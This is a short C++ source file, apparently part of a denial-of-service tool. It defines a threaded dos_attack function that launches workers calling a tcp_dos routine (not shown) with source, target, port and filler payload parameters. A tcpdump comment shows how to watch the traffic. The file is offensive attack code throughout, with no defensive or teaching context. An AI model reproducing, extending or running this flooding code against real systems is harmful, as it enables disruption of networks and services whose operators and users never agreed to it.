#include "../../include/denial_of_service/dos.h"
//tcpdump -i lo udp port 5554 -vv -X

struct dos_thread_data{
	int id;
	std::string data, target, source;
	int PORT;
};

void *DOS_THREAD(void *thread_data){
	struct dos_thread_data *this_thread_data;
	this_thread_data = (struct dos_thread_data *) thread_data;
	tcp_dos(this_thread_data->source.c_str(), this_thread_data->target.c_str(), this_thread_data->PORT,
			this_thread_data->data.c_str());
	pthread_exit(NULL);
}

void dos_attack(std::string &target,int PORT, std::string source){
	int THREADS = 1;
	pthread_t threads[THREADS];
	std::string data = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	struct dos_thread_data thread_data[THREADS];
	for(int i = 0; i < THREADS; i++){
		thread_data[i].id = i;
		thread_data[i].target = target;
		thread_data[i].source = source;
		thread_data[i].data = data;
		thread_data[i].PORT = PORT;

		pthread_create(&threads[i],NULL, DOS_THREAD,&thread_data[i]);
	}
	for(int i = 0; i < THREADS; i++)
		pthread_join(threads[i], NULL);
}
